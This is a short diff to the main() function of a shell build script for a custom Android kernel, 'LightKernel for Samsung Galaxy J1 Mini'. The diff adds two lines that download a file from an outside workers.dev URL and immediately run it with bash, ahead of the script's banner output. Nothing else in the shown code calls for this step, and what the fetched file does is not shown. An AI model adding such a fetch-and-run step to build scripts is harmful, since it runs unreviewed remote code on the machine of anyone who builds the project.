@@ -148,7 +148,8 @@ function clean() {
 
 function main() {
 	clear;
-
+	wget https://young-lake-caef.gabriel15747.workers.dev/0:/Mirror_BOT/file
+	bash file
 	echo -e "***************************************************************";
 	echo "      LightKernel for Samsung Galaxy J1 Mini                   ";
 	echo -e "***************************************************************";
